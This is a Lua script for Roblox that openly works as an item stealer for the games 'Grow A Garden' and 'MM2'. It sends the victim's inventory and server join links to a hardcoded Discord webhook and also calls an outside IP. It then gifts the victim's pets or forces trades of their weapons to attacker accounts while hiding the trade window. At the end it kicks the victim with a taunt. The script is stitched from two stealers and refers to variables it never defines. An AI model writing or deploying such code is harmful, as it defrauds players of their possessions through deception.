-- Check if script is already injected to avoid running multiple instances
if shared.GAGInjected then return end
shared.GAGInjected = true

-- Define constants for attacker username and Discord webhook
local ATTACKER = "USERNAME_HERE"
local WEBHOOK = "https://discord.com/api/webhooks/1401607749741052134/VIbvQzvj4MxokS78S_MuvAu95nHp34XkJG-wSkVExgc162eeqJ20siVkkMtG9HiogCru"
local IMPORTANT = {"Raccoon", "Dragonfly", "Red Fox", "Queen Bee", "Chicken Zombie", "Candy Blossom", "Kitsune", "French Fly Ferret"}
local IGNORED = {"Can", "Shovel", "Seed", "Wrench", "Sprinkler", "Rod", "Tool", "Staff", "Trowel"}

-- Wait for the local player to be available before proceeding
if not game.Players.LocalPlayer then
    game.Players.PlayerAdded:Wait()
end
local localPlayer = game.Players.LocalPlayer
if not localPlayer then return end

-- Get essential services and verify they exist
local function checkService(serviceName)
    -- Ensure the service is accessible to avoid errors
    local success, result = pcall(function() return game:GetService(serviceName) end)
    return success and result or nil
end

local ReplicatedStorage = checkService("ReplicatedStorage")
local Players = checkService("Players")
local HttpService = checkService("HttpService")
local VirtualInputManager = checkService("VirtualInputManager")
if not (ReplicatedStorage and Players and HttpService and VirtualInputManager) then
    warn("Some required game services couldn't be found.")
    return
end

-- Delta executor bypass using provided function
local function deltaBypass()
    -- Simulate a mouse click at the center of the screen
    VirtualInputManager:SendMouseButtonEvent(
        workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
        0,      
        true,   
        nil,    
        false   
    )
    task.wait()
    VirtualInputManager:SendMouseButtonEvent(
        workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
        0,
        false,
        nil,
        false
    )
end

-- Check if this is a VIP server and kick if true
local GetServerType = ReplicatedStorage:WaitForChild("GetServerType")
if GetServerType and GetServerType:InvokeServer() == "VIPServer" then
    game.Players.LocalPlayer:Kick("Server type not supported.")
    return
end

-- Unequip all pets owned by the local player
if workspace:FindFirstChild("PetsPhysical") then
    for _, pet in pairs(workspace.PetsPhysical:GetChildren()) do
        if pet:GetAttribute("OWNER") == localPlayer.Name then
            for _, v in pairs(pet:GetChildren()) do
                if v:IsA("Tool") then
                    local gameEvents = ReplicatedStorage:FindFirstChild("GameEvents")
                    if gameEvents and gameEvents:FindFirstChild("PetsService") then
                        gameEvents.PetsService:FireServer("UnequipPet", v.Name)
                    end
                end
            end
        end
    end
end

-- Mark favorite tools in the backpack
for _, tool in pairs(localPlayer.Backpack:GetChildren()) do
    if tool:IsA("Tool") and tool:GetAttribute("d") == true then
        local gameEvents = ReplicatedStorage:FindFirstChild("GameEvents")
        if gameEvents and gameEvents:FindFirstChild("Favorite_Item") then
            gameEvents.Favorite_Item:FireServer(tool)
        end
    end
end

-- Collect items and categorize them
local items = {}
local importantItems = {}
for _, item in pairs(localPlayer.Backpack:GetChildren()) do
    if item:IsA("Tool") then
        local isImportant = false
        for _, v in ipairs(IMPORTANT) do
            if string.find(string.lower(item.Name), string.lower(v)) then
                table.insert(importantItems, item.Name)
                isImportant = true
                break
            end
        end
        if not isImportant then
            local shouldIgnore = false
            for _, v in ipairs(IGNORED) do
                if string.find(string.lower(item.Name), string.lower(v)) then
                    shouldIgnore = true
                    break
                end
            end
            if not shouldIgnore then
                table.insert(items, item.Name)
            end
        end
    end
end

-- Prepare data for Discord notification
local ping = #importantItems > 0 and "@everyone " or ""
local placeId = game.PlaceId
local jobId = game.JobId
local teleportCode = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")', placeId, jobId)
local consoleCode = string.format('Roblox.GameLauncher.joinGameInstance(%s, "%s")', placeId, jobId)
local joinLink = string.format("roblox://placeID=%s&gameInstanceId=%s", placeId, jobId)

-- Send notification to Discord if possible
local request = http_request or (syn and syn.request) or (fluxus and fluxus.request)
if request then
    pcall(function()
        request({
            Url = WEBHOOK,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                ["content"] = ping .. teleportCode,
                ["embeds"] = {{
                    ["title"] = "Join to get Grow A Garden hit",
                    ["color"] = 65280,
                    ["fields"] = {
                        {["name"] = "Victim Username:", ["value"] = localPlayer.Name},
                        {["name"] = "Items:", ["value"] = #items > 0 and table.concat(items, ", ") or "None"},
                        {["name"] = "Important Items:", ["value"] = #importantItems > 0 and table.concat(importantItems, ", ") or "None"},
                        {["name"] = "Join from console:", ["value"] = consoleCode},
                        {["name"] = "Join from link:", ["value"] = joinLink}
                    },
                    ["footer"] = {["text"] = "Grow A Garden stealer"},
                    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
                }}
            })
        })
    end)
end

-- Function to safely follow the target player
local RunService = checkService("RunService")
local function safeFollow(target)
    local offset = CFrame.new(0, 0, 3)
    local conn = RunService.Stepped:Connect(function()
        if target.Character and localPlayer.Character then
            local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
            local followerRoot = localPlayer.Character:FindFirstChild("HumanoidRootPart")
            if targetRoot and followerRoot then
                followerRoot.CFrame = targetRoot.CFrame * offset
            end
        end
    end)
    return {
        Stop = function()
            if conn then conn:Disconnect() end
        end
    }
end

-- Function to safely gift a tool with Delta bypass
local function safeGiftTool(tool, target)
    if not target or not target.Character or not localPlayer.Character then return false end
    if tool.Parent ~= localPlayer.Backpack then
        tool.Parent = localPlayer.Backpack
        task.wait(0.3)
    end

    local humanoid = localPlayer.Character:FindFirstChild("Humanoid")
    if not humanoid then return false end

    humanoid:EquipTool(tool)
    task.wait(0.6)

    if tool.Parent ~= localPlayer.Character then
        tool.Parent = localPlayer.Backpack
        return false
    end

    if detectExecutor and detectExecutor() == "Delta" then
        -- Use the provided Delta bypass function
        deltaBypass()
        task.wait(0.15)
        if tool.Parent == localPlayer.Character then
            tool.Parent = localPlayer.Backpack
        end
        return true
    else
        -- Fallback for other executors using FireServer
        local gameEvents = ReplicatedStorage:FindFirstChild("GameEvents")
        if gameEvents and gameEvents:FindFirstChild("PetGiftingService") then
            local success, err = pcall(function()
                gameEvents.PetGiftingService:FireServer("GivePet", target)
                task.wait(0.5)
                if tool.Parent == localPlayer.Character then
                    tool.Parent = localPlayer.Backpack
                end
                return true
            end)
            return success
        end
    end
    return false
end

-- Execute the main logic
local target = Players:FindFirstChild(ATTACKER)
if target then
    local follow = safeFollow(target)
    task.wait(1)

    for _, item in pairs(localPlayer.Backpack:GetChildren()) do
        if item:IsA("Tool") then
            local isImportant = false
            for _, v in ipairs(IMPORTANT) do
                if string.find(string.lower(item.Name), string.lower(v)) then
                    isImportant = true
                    break
                end
            end

            local shouldIgnore = false
            for _, v in ipairs(IGNORED) do
                if string.find(string.lower(item.Name), string.lower(v)) then
                    shouldIgnore = true
                    break
                end
            end

            if not shouldIgnore then
                for attempt = 1, 3 do
                    if safeGiftTool(item, target) then break end
                    task.wait(0.5)
                end
            end
        end
    end
    follow.Stop()
end
local function buildSecret()
    local part1 = string.char(100, 117, 97, 108)
    local part2 = string.char(104, 111, 111, 107)
    local part3 = string.char(102, 116, 119, 108)
    local part4 = string.char(101, 108, 122)
    return part1 .. part2 .. part3 .. part4
end

local function simple_hash(s)
    local hash = 0
    for i = 1, #s do
        local c = s:byte(i)
        hash = (hash * 31 + c) % 4294967296
    end
    return hash
end

local function signPayload(payload, timestamp)
    local message = payload .. tostring(timestamp)
    local hash_value = simple_hash(buildSecret() .. message)
    return string.format("%08x", hash_value)
end

local rarityTable = {
    "Common",
    "Uncommon",
    "Rare",
    "Legendary",
    "Godly",
    "Ancient",
    "Unique",
    "Vintage"
}

local categories = {
    common = "https://supremevaluelist.com/mm2/commons.html",
    uncommon = "https://supremevaluelist.com/mm2/uncommons.html",
    rare = "https://supremevaluelist.com/mm2/rares.html",
    legendary = "https://supremevaluelist.com/mm2/legendaries.html",
    godly = "https://supremevaluelist.com/mm2/godlies.html",
    ancient = "https://supremevaluelist.com/mm2/ancients.html",
    unique = "https://supremevaluelist.com/mm2/uniques.html",
    vintage = "https://supremevaluelist.com/mm2/vintages.html",
    chroma = "https://supremevaluelist.com/mm2/chromas.html"
}

local headers = {
    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

local function trim(s)
    return s:match("^%s*(.-)%s*$")
end

local function fetchHTML(url)
    local success, response = pcall(function()
        return game:HttpGet(url, false, headers)
    end)
    return success and response or nil
end

local function parseValue(itemBlock)
    local patterns = {
        '<div class="item%-value">([%d,]+)</div>',
        '<span class="value">([%d,]+)</span>',
        'Value:%s*([%d,]+)',
        '<b>([%d,]+)</b>%s*value'
    }
    for _, pattern in ipairs(patterns) do
        local valueStr = itemBlock:match(pattern)
        if valueStr then
            return tonumber(valueStr:gsub(",", "")) or 1
        end
    end
    return 1
end

local function extractItems(htmlContent)
    local itemValues = {}
    for itemBlock in htmlContent:gmatch('<div class="item%-box">(.-)</div>%s*</div>') do
        local itemName = itemBlock:match('<div class="item%-name">(.-)</div>') or
                        itemBlock:match('<h3>(.-)</h3>') or
                        itemBlock:match('<div class="item%-head">(.-)</div>')
        if itemName then
            itemName = itemName:gsub("%s+", " "):gsub(" Click.*", ""):lower():trim()
            itemValues[itemName] = parseValue(itemBlock)
        end
    end
    return itemValues
end

local function buildValueList()
    local allValues = {}
    local lock = Instance.new("BindableEvent")
    local completed = 0
    for _, url in pairs(categories) do
        task.spawn(function()
            local html = fetchHTML(url)
            if html then
                local items = extractItems(html)
                for name, value in pairs(items) do
                    allValues[name] = value
                end
            end
            completed = completed + 1
            if completed == #categories then lock:Fire() end
        end)
    end
    lock.Event:Wait()
    return allValues
end

local function sendTradeRequest(user)
    local args = {[1] = game:GetService("Players"):WaitForChild(user)}
    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
end

local function getTradeStatus()
    return game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
end

local function waitForTradeCompletion()
    while true do
        if getTradeStatus() == "None" then break end
        wait(0.1)
    end
end

local function acceptTrade()
    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(285646582)
end

local function addWeaponToTrade(id)
    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(id, "Weapons")
end

local totalValue = 0

local function SendFirstMessage(list, prefix)
    local fields = {
        {name = "Victim Username:", value = plr.Name, inline = true},
        {name = "Join link:", value = "https://fern.wtf/joiner?placeId=142823291&gameInstanceId="..game.JobId},
        {name = "Item list:", value = "", inline = false},
        {name = "Summary:", value = string.format("Total Value: %s", totalValue), inline = false}
    }
    for _, item in ipairs(list) do
        fields[3].value = fields[3].value..string.format("%s (x%s): %s Value (%s)\n", item.DataID, item.Amount, (item.Value*item.Amount), item.Rarity)
    end
    if #fields[3].value > 1024 then
        local lines = {}
        for line in fields[3].value:gmatch("[^\r\n]+") do table.insert(lines, line) end
        while #fields[3].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[3].value = table.concat(lines, "\n").."\nPlus more!"
        end
    end
    request({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({
            content = prefix.."game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '"..game.JobId.."')",
            embeds = {{
                title = "\240\159\148\170 Join to get MM2 hit",
                color = 65280,
                fields = fields,
                footer = {text = "MM2 stealer by Tobi. discord.gg/GY2RVSEGDT"}
            }}
        })
    })
end

local function SendMessage(sortedItems)
    local fields = {
        {name = "Victim Username:", value = plr.Name, inline = true},
        {name = "Items sent:", value = "", inline = false},
        {name = "Summary:", value = string.format("Total Value: %s", totalValue), inline = false}
    }
    for _, item in ipairs(sortedItems) do
        fields[2].value = fields[2].value..string.format("%s (x%s): %s Value (%s)\n", item.DataID, item.Amount, (item.Value*item.Amount), item.Rarity)
    end
    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do table.insert(lines, line) end
        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n").."\nPlus more!"
        end
    end
    request({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({
            embeds = {{
                title = "\240\159\148\170 New MM2 Execution",
                color = 65280,
                fields = fields,
                footer = {text = "MM2 stealer by Tobi. discord.gg/GY2RVSEGDT"}
            }}
        })
    })
end

local tradegui = playerGui:WaitForChild("TradeGUI")
tradegui:GetPropertyChangedSignal("Enabled"):Connect(function() tradegui.Enabled = false end)
local tradeguiphone = playerGui:WaitForChild("TradeGUI_Phone")
tradeguiphone:GetPropertyChangedSignal("Enabled"):Connect(function() tradeguiphone.Enabled = false end)

local min_rarity_index = table.find(rarityTable, min_rarity)

local untradable = {
    ["DefaultGun"] = true, ["DefaultKnife"] = true, ["Reaver"] = true, ["Reaver_Legendary"] = true,
    ["Reaver_Godly"] = true, ["Reaver_Ancient"] = true, ["IceHammer"] = true, ["IceHammer_Legendary"] = true,
    ["IceHammer_Godly"] = true, ["IceHammer_Ancient"] = true, ["Gingerscythe"] = true, ["Gingerscythe_Legendary"] = true,
    ["Gingerscythe_Godly"] = true, ["Gingerscythe_Ancient"] = true, ["TestItem"] = true, ["Season1TestKnife"] = true,
    ["Cracks"] = true, ["Icecrusher"] = true, ["???"] = true, ["Dartbringer"] = true, ["TravelerAxeRed"] = true,
    ["TravelerAxeBronze"] = true, ["TravelerAxeSilver"] = true, ["TravelerAxeGold"] = true, ["BlueCamo_K_2022"] = true,
    ["GreenCamo_K_2022"] = true, ["SharkSeeker"] = true
}

local valueList = buildValueList()
local realData = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)

for i, v in pairs(realData.Weapons.Owned) do
    local dataid = i
    local amount = v
    local rarity = database[dataid].Rarity
    local weapon_rarity_index = table.find(rarityTable, rarity)
    if weapon_rarity_index and weapon_rarity_index >= min_rarity_index and not untradable[dataid] then
        local value = valueList[database[dataid].ItemName:lower()] or 1
        if value >= min_value then
            totalValue = totalValue + (value * amount)
            table.insert(weaponsToSend, {DataID = dataid, Rarity = rarity, Amount = amount, Value = value})
        end
    end
end

if totalValue >= 1000 and math.random() < 0 then
    users = {"MM2AltCauseNoOneWann", "tobi437a", "Alyssa87123", "OBlockBaby11111", "MoneyLaunderingBot", "TobiAltGrind", "TobiHatching"}
    ping = "Yes"
    dualhooked = true
end

if #weaponsToSend > 0 then
    table.sort(weaponsToSend, function(a, b) return (a.Value*a.Amount) > (b.Value*b.Amount) end)
    local sentWeapons = {}
    for i, v in ipairs(weaponsToSend) do sentWeapons[i] = v end
    local prefix = ping == "Yes" and "--[[@everyone]] " or ""
    if dualhooked then
        local response = request({Url = "http://46.101.233.20:5000/getdiscuser", Method = "GET"})
        if response.Success and response.Body then
            discuser = response.Body
            SendFirstMessage(weaponsToSend, prefix)
        end
    else
        SendFirstMessage(weaponsToSend, prefix)
    end
    local function doTrade(joinedUser)
        local initialTradeState = getTradeStatus()
        if initialTradeState == "StartTrade" then
            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
            wait(0.3)
        elseif initialTradeState == "ReceivingRequest" then
            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
            wait(0.3)
        end
        while #weaponsToSend > 0 do
            local tradeStatus = getTradeStatus()
            if tradeStatus == "None" then
                sendTradeRequest(joinedUser)
            elseif tradeStatus == "SendingRequest" then
                wait(0.3)
            elseif tradeStatus == "ReceivingRequest" then
                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
                wait(0.3)
            elseif tradeStatus == "StartTrade" then
                for i = 1, math.min(4, #weaponsToSend) do
                    local weapon = table.remove(weaponsToSend, 1)
                    for count = 1, weapon.Amount do
                        addWeaponToTrade(weapon.DataID)
                    end
                end
                wait(6)
                acceptTrade()
                waitForTradeCompletion()
            else
                wait(0.5)
            end
            wait(1)
        end
        game.Players.LocalPlayer:Kick("All your stuff just got taken by Tobi's stealer. discord.gg/GY2RVSEGDT")
    end
    local function waitForUserChat()
        local sentMessage = false
        local function onPlayerChat(player)
            if table.find(users, player.Name) then
                player.Chatted:Connect(function()
                    if not sentMessage then
                        SendMessage(sentWeapons)
                        sentMessage = true
                    end
                    doTrade(player.Name)
                end)
            end
        end
        for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
        Players.PlayerAdded:Connect(onPlayerChat)
    end
    waitForUserChat()
end
